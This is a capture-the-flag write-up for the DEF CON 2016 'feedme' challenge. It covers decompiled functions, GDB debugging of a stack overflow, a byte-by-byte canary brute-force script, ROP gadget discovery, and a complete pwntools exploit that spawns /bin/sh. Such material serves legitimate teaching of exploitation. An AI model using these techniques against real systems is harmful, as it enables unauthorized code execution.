---
title: "Baby's First) feedme"
sidebar_position: 1
---
## **Information**

### **Description**
```
Don't forget to feed me <http://www.scs.stanford.edu/brop/>

<http://download.quals.shallweplayaga.me/47aa9b0d8ad186754acd4bece3d6a177/feedme>

[feedme\_47aa9b0d8ad186754acd4bece3d6a177.quals.shallweplayaga.me:4092](http://download.quals.shallweplayaga.me/47aa9b0d8ad186754acd4bece3d6a177/feedme)
```

### **File**
* [feedme](/attachments/327948/327949.bin)

### **Source Code**
* <https://github.com/legitbs/quals-2016/tree/master/feedme>

## **Writeup**

### File information
```sh title="File information"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ file feedme 
feedme: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ checksec.sh --file feedme 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   feedme
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

### **Binary analysis**

#### **Main(0x0804917A)**

* This function performs the following operations:
  + Sets SIGALRM using the signal() function.
  + After 150 seconds, sigAlarm() is called and the program terminates.
  + Calls the Service() / Feedme() function.

```c title="Main(0x0804917A)"
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signal(14, sigAlarm);
  alarm(150u);
  _IO_setvbuf(off_80EA4C0, 0, 2, 0);
  _IO_new_fclose(off_80EA4BC);
  Service();
  return 0;
}
```

#### **Service(0x080490B0)**

* This function performs the following operations:
  + Creates a child process using the fork() function.
  + When the child process is created successfully, it executes the Feedme() function.
  + Once the Feedme() function finishes, it waits for the child process to terminate using waitpid().
    - Checks whether it terminated normally using the return value.
  + Repeats this process up to 800 times using a for loop.

```c title="Service(0x080490B0)"
void Service()
{
  unsigned __int8 v0; // al@3
  int v1; // [esp+0h] [ebp-28h]@0
  const char **v2; // [esp+4h] [ebp-24h]@0
  const char **v3; // [esp+8h] [ebp-20h]@0
  char *argv; // [esp+10h] [ebp-18h]@1
  unsigned int i; // [esp+14h] [ebp-14h]@1
  const struct timespec *childPid; // [esp+18h] [ebp-10h]@2
  int waitPid; // [esp+1Ch] [ebp-Ch]@4

  argv = 0;
  for ( i = 0; i <= 799; ++i )
  {
    childPid = fork();
    if ( !childPid )
    {
      v0 = Feedme(v1, v2, v3);
      printf_0("YUM, got %d bytes!\n", v0);
      return;
    }
    waitPid = __waitpid(childPid, &argv, 0);
    if ( waitPid == -1 )
    {
      printf((int)"Wait error!");
      exit(-1);
    }
    if ( argv == (char *)-1 )
    {
      printf((int)"Child IO error!");
      exit(-1);
    }
    printf((int)"Child exit.");
    _IO_fflush(0);
  }
}
```

#### **FeedMe(0x8049036)**

* This function performs the following operations:
  + Receives a numeric value from the UserInputNum() function.
  + Receives a string from user input using the UserInputStr() function.
    - The input string is stored in buf.
  + Converts the value using the converter() function and returns it.
    - Converts integer values to hex.
* The critical parts of this function are the buf and canary variables:
  + The size of buf is 32 bytes.
  + canary is declared immediately after buf.
  + Thus, if a Stack Overflow occurs, the Canary value can be verified/overwritten.

```c title="FeedMe(0x8049036)"
int __cdecl FeedMe(int argc, const char **argv, const char **envp)
{
  unsigned __int8 number; // ST1B_1@1
  char *str; // eax@1
  int result; // eax@1
  int v6; // edx@1
  char buf; // [esp+1Ch] [ebp-2Ch]@1
  int canary; // [esp+3Ch] [ebp-Ch]@1

  canary = *MK_FP(__GS__, 20);
  printf((int)"FEED ME!");
  number = UserInputNum();
  UserInputStr((int)&buf, number);
  str = converter(&buf, number, 16u);
  printf_0("ATE %s\n", str);
  result = number;
  v6 = *MK_FP(__GS__, 20) ^ canary;
  return result;
}
```

#### **UserInputNum(0x8048E42)**
* This function performs the following operations:
  + Reads a single character from the user using the read() function.
    - The input character is stored as an integer.
    - For example, if 'A' is entered, it is used as the number 65 (0x41).
  + Returns the input value.

```c title="UserInputNum(0x8048E42)"
int UserInputNum()
{
  unsigned __int8 number; // [esp+1Bh] [ebp-Dh]@1
  int len; // [esp+1Ch] [ebp-Ch]@1

  len = __libc_read(0, &number, 1);
  if ( len != 1 )
    exit(-1);
  return number;
}
```

#### **UserInputStr(0x8048E7E)**
* This function performs the following operations:
  + Reads a string from the user using the read() function.
  + The input string is stored in buf + location.
* The vulnerability occurs here:
  + buf is a char variable allocated on the stack in the FeedMe() function.
  + UserInputStr() receives and uses the address of buf from the FeedMe() function.
  + The size of buf is 32 bytes.
  + However, size can be set to a value greater than 32 via UserInputNum().
  + In other words, a Stack Overflow occurs.
  + By leveraging this vulnerability, we can also leak the Canary value used by the binary.

```c title="UserInputStr(0x8048E7E)"
int __cdecl UserInputStr(int buf, int number)
{
  int result; // eax@1
  int size; // [esp+14h] [ebp-14h]@1
  int location; // [esp+18h] [ebp-10h]@1
  int len; // [esp+1Ch] [ebp-Ch]@2

  result = number;
  size = number;
  location = 0;
  while ( size )
  {
    len = __libc_read(0, location + buf, size);
    if ( len <= 0 )
      exit(-1);
    location += len;
    result = len;
    size -= len;
  }
  return result;
}
```

### Debugging

#### **Debugging child processes**

* In this program, the FeedMe() function is called within a child process.

```c title="Service(0x080490B0)"
void Service()
{
...
    childPid = fork();
    if ( !childPid )
    {
      v0 = Feedme(v1, v2, v3);
      printf_0("YUM, got %d bytes!\n", v0);
      return;
    }
...
}
```

* To debug child processes with GDB, configure the following setting:

```sh title="GDB settings"
(gdb) set follow-fork-mode child 
(gdb) show follow-fork-mode 
Debugger response to a program call of fork or vfork is "child".
(gdb)
```

#### **Check for Stack Overflow**

* Set breakpoints as follows:

```sh title="Break point"
(gdb) b *0x08049069
Breakpoint 1 at 0x8049063(UserInputStr)
(gdb) b *0x0804906E
Breakpoint 2 at 0x804906e
```

* To confirm the Stack Overflow, pass '$' as the first input:
  + '$' corresponds to decimal 36 (0x24).
* For the second input, pass 32 'A's and 3 'B's:
  + The 'A's fill the buf buffer.
    - buf area: 0xffffd26c ~ 0xffffd28c
  + The 'B's overwrite the Canary area.
    - canary area: 0xffffd28c
  + Value: 0x080490dc
* Passing these values triggers the following error:
  + This error occurs because the canary value has been corrupted.
  + The following code detects the canary corruption:
  - "v6 = \*MK\_FP(\_\_GS\_\_, 20) ^ canary;"
* Therefore, if we can leak the Canary value, we can overwrite the return address.

```sh title="Check for Stack Overflow"
(gdb) r
Starting program: /home/lazenca0x0/Documents/DEFCON 2016/feedme 
[New process 10798]
FEED ME!
$
[Switching to process 10798]

Breakpoint 1, 0x08049069 in ?? ()
(gdb) 
(gdb) x/wx $esp
0xffffd250:	0xffffd26c
(gdb) x/20wx 0xffffd26c
0xffffd26c:	0x00000000	0x00002710	0x00000000	0x00000000
0xffffd27c:	0x00000000	0x080ea0a0	0x00000000	0x00000000
0xffffd28c:	0xfad83800	0x00000000	0x080ea00c	0xffffd2c8
0xffffd29c:	0x080490dc	0x080ea0a0	0x00000000	0x080ed840
0xffffd2ac:	0x0804f8b4	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBB

Breakpoint 2, 0x0804906e in ?? ()
(gdb) x/20wx 0xffffd26c
0xffffd26c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd27c:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd28c:	0x0a424242	0x00000000	0x080ea00c	0xffffd2c8
0xffffd29c:	0x080490dc	0x080ea0a0	0x00000000	0x080ed840
0xffffd2ac:	0x0804f8b4	0x00000000	0x00000000	0x00000000
(gdb) c
Continuing.
ATE 41414141414141414141414141414141...
*** stack smashing detected ***: /home/lazenca0x0/Documents/DEFCON 2016/feedme terminated

Program received signal SIGABRT, Aborted.
0xf7ffdc90 in __kernel_vsyscall ()
(gdb)
```

### Canary Leak

* Using the Stack Overflow vulnerability identified above, we can leak the Canary value.
* This works because the child processes share the same Canary value generated by the parent process until the program terminates.
* The following script can be used to leak the Canary value:
  + Leaks the Canary byte by byte (1 byte at a time).
    - The Canary size is 4 bytes.
  + The tested byte range is 0x00 ~ 0xff.

```python title="Canary Leak"
from pwn import *

p = process('./feedme')
p.recvline()

canary = ""
while len(canary) < 4:
        for i in xrange(256):
                buf = "A" * 32 + canary + chr(i)
                p.send(chr(len(buf)) + buf)
                data = p.recvuntil("FEED ME!")
                if "YUM" in data:
                        canary += chr(i)
                        print "[+] canary: %r" % chr(i)
                        break

log.info("CANARY : " + canary.encode("hex"))
```

### Structure of Exploit code
```
1. Use the read() function to receive input from the user and store it in a memory region with WRITE permissions.
2. Use the execve() function to execute the command provided by the user.
```
* The following information is required for an attack:
```
* Memory area to store user input
* Shellcode / command string setup
* ROP gadgets
```
### **Information for attack**

#### **ROP design**

* To obtain a shell via the program's vulnerability, we will use the following flow:

  + Use UserInputStr() to read a command string ("/bin/sh\0") from the user and store it at a designated memory address.
  + Pass the address where the string is stored as the first argument to the execve() system call.

```python title="ROP design"
sub_8048E7E("Memory address to store user input", 10)
execve("Memory address to store user input", 0, 0)
```

#### **Memory space to store user input**

* A writable memory space is required to store the user input.
* Check the "Section Headers" of the file using readelf:
  + Sections with Write permissions, such as .bss, .data, etc., can be used.

```sh title="readelf -S feedme"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ readelf -S feedme 
There are 27 section headers, starting at offset 0xa20a0:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.ABI-tag     NOTE            080480f4 0000f4 000020 00   A  0   0  4
  [ 2] .rel.plt          REL             08048138 000138 000070 08   A  0   4  4
  [ 3] .init             PROGBITS        080481a8 0001a8 000023 00  AX  0   0  4
  [ 4] .plt              PROGBITS        080481d0 0001d0 0000e0 00  AX  0   0 16
  [ 5] .text             PROGBITS        080482b0 0002b0 0758c4 00  AX  0   0 16
  [ 6] __libc_freeres_fn PROGBITS        080bdb80 075b80 000ac6 00  AX  0   0 16
  [ 7] __libc_thread_fre PROGBITS        080be650 076650 00006f 00  AX  0   0 16
  [ 8] .fini             PROGBITS        080be6c0 0766c0 000014 00  AX  0   0  4
  [ 9] .rodata           PROGBITS        080be6e0 0766e0 01bff0 00   A  0   0 32
  [10] __libc_subfreeres PROGBITS        080da6d0 0926d0 00002c 00   A  0   0  4
  [11] __libc_atexit     PROGBITS        080da6fc 0926fc 000004 00   A  0   0  4
  [12] __libc_thread_sub PROGBITS        080da700 092700 000004 00   A  0   0  4
  [13] .eh_frame         PROGBITS        080da704 092704 00e2f0 00   A  0   0  4
  [14] .gcc_except_table PROGBITS        080e89f4 0a09f4 0000c2 00   A  0   0  1
  [15] .tdata            PROGBITS        080e9f40 0a0f40 000010 00 WAT  0   0  4
  [16] .tbss             NOBITS          080e9f50 0a0f50 000018 00 WAT  0   0  4
  [17] .init_array       INIT_ARRAY      080e9f50 0a0f50 000008 00  WA  0   0  4
  [18] .fini_array       FINI_ARRAY      080e9f58 0a0f58 000008 00  WA  0   0  4
  [19] .jcr              PROGBITS        080e9f60 0a0f60 000004 00  WA  0   0  4
  [20] .data.rel.ro      PROGBITS        080e9f80 0a0f80 000070 00  WA  0   0 32
  [21] .got              PROGBITS        080e9ff0 0a0ff0 000008 04  WA  0   0  4
  [22] .got.plt          PROGBITS        080ea000 0a1000 000044 04  WA  0   0  4
  [23] .data             PROGBITS        080ea060 0a1060 000f20 00  WA  0   0 32
  [24] .bss              NOBITS          080eaf80 0a1f80 00180c 00  WA  0   0 32
  [25] __libc_freeres_pt NOBITS          080ec78c 0a1f80 000018 00  WA  0   0  4
  [26] .shstrtab         STRTAB          00000000 0a1f80 000120 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

* Inspecting the memory map after executing the binary reveals the following:
  + The memory region with Write permissions in this binary is "0x080e9000-0x080eb000".
  + Comparing this with the Section Header info, the range from "0x080e9000" to "0x080e9f40" is unused space.
  + We can determine it is empty/unused based on the following:
    - .gcc\_except\_table uses 0xc2 bytes starting from 0x080e89f4.
      * 0x080e89f4 + 0xc2 = 0x80e8ab6
    - The .tdata section begins at 0x080e9f40.
      * 0x080e9f40 - 0x80e8ab6 = 0x148a
* We will store the user input at address 0x080e9000.

```sh title="cat /proc/{PID}/maps"
(gdb) shell cat /proc/2627/maps
08048000-080e9000 r-xp 00000000 08:01 703612     /home/lazenca0x0/Documents/DEFCON2016/feedme/feedme
080e9000-080eb000 rw-p 000a0000 08:01 703612     /home/lazenca0x0/Documents/DEFCON2016/feedme/feedme
080eb000-0810f000 rw-p 00000000 00:00 0          [heap]
b7ffc000-b7ffe000 r--p 00000000 00:00 0          [vvar]
b7ffe000-b8000000 r-xp 00000000 00:00 0          [vdso]
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
(gdb)
```

#### **ROP gadget - UserInputStr(system call)**

* The UserInputStr() function is called using standard cdecl conventions.
* Therefore, a "pop esi ; pop edi ; ret ;" gadget is required to clear arguments off the stack.
* You can locate the gadget as follows:
  + We can use the gadget at 0x0804846e.

```sh title="ROP Gadget - UserInputStr(system call)"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 2 |grep "pop esi ; pop edi ; ret "
0x0804846e: pop esi ; pop edi ; ret  ;  (1 found)

...

lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

#### **ROP gadget - execve(int 0x80, interrupt 0x80)**

* In the case of execve(), since it is invoked via the "int 0x80" instruction, registers are used for arguments.
  + To pass arguments, gadgets containing "pop eax", "pop ebx", "pop ecx", and "pop edx" are needed.
  + However, a single gadget containing all of these instructions does not exist in the binary.

```sh title="ROP Gadget - pop eax ; pop ebx ; pop ecx ; pop edx ;"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 5 |grep "pop eax ; pop ebx ; pop ecx ; pop edx ;"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

* We can find a gadget to load the execve syscall number into eax:

```sh title="ROP Gadget - pop eax ; ret"
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 1 |grep "pop eax ; ret  ;"
0x080bb496: pop eax ; ret  ;  (1 found)
0x080e243d: pop eax ; ret  ;  (1 found)
0x080e433a: pop eax ; ret  ;  (1 found)
0x080e6a5c: pop eax ; ret  ;  (1 found)
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$
```

* We can also find a gadget to set the argument registers:

```sh title="ROP Gadget - pop edx ; pop ecx ; pop ebx ; ret"
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$ ./rp-lin-x86 -f ./feedme -r 3 |grep "pop edx ; pop ecx ; pop ebx ; ret  ;"
0x0806f370: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
lazenca0x0@ubuntu:~/Documents/DEFCON 2016/feedme$
```

* And an "int 0x80" gadget is required to trigger the execve system call:

```sh title="ROP Gadget - 'int 0x80'"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$ ./rp-lin-x86 -f ./feedme -r 0 |grep "int 0x80"
0x08049761: int 0x80 ;  (1 found)

...
lazenca0x0@ubuntu:~/Documents/DEFCON2016/feedme$
```

* Constructing the ROP chain with the identified information gives the following:

```python title="ROP Chain"
#sub_8048E7E("Memory address to store user input", 10)
payload += p32(0x08048E7E)	# 0x08048E7E
payload += p32(0x0804846e)	# POP esi ; POP edi ; ret;
payload += p32(0x080e9000)	# Arg1 : 0x080e9000
payload += p32(10)			# Arg2 : 10
#execve("Memory address to store user input", 0, 0)
payload += p32(0x0806f370)	# POP edx ; POP ecx ; POP ebx ; ret ;
payload += p32(0)
payload += p32(0)
payload += p32(0x080e9000)	# Arg1 : 0x080e9000
#rax = 11, int 0x80
payload += p32(0x080bb496)	# POP eax ; ret ;
payload += p32(11)			# execve call number
payload += p32(0x08049761)	# int 0x80;
```

#### **Summary of Key Information**

```txt title="Information used for attack"
* Memory space to store user input: 0x080e9000
* ROP gadgets
  * "pop esi ; pop edi ; ret ;" : 0x0804846e
  * "pop edx ; pop ecx ; pop ebx ; ret ;" : 0x0806f370
  * "pop eax ; ret ;" : 0x080bb496
  * "int 0x80 ;" : 0x08049761
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

p = process('./feedme')

p.recvline()

canary = ""
while len(canary) < 4:
        for i in xrange(256):
                buf = "A" * 32 + canary + chr(i)
                p.send(chr(len(buf)) + buf)
                data = p.recvuntil("FEED ME!")
                if "YUM" in data:
                        canary += chr(i)
                        print "[+] canary: %r" % chr(i)
                        break

log.info("CANARY : " + canary.encode("hex"))

p.recv()
payload = "A"*32
payload += canary
payload += "A"*12
payload += p32(0x08048E7E)
payload += p32(0x0804846e)
payload += p32(0x080e9000)
payload += p32(10)
payload += p32(0x0806f370)
payload += p32(0)
payload += p32(0)
payload += p32(0x080e9000)
payload += p32(0x080bb496)
payload += p32(11)
payload += p32(0x08049761)

log.info("Payload len : " + chr(len(payload)))
log.info("Payload Hex : " + payload.encode("hex"))
log.info("Payload Str : " + payload)

p.send(chr(len(payload)))
p.send(payload)
p.recv()
p.send("/bin/sh\0")
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag |  |

## **Related Site**

* <http://rootfoo.org/ctf/2016-legitbs-ctf-quals-feedme>
* <http://blukat29.github.io/2016/05/defcon-2016-quals-feedme/>
* <http://hackoftheday.securitytube.net/2013/04/demystifying-execve-shellcode-stack.html>
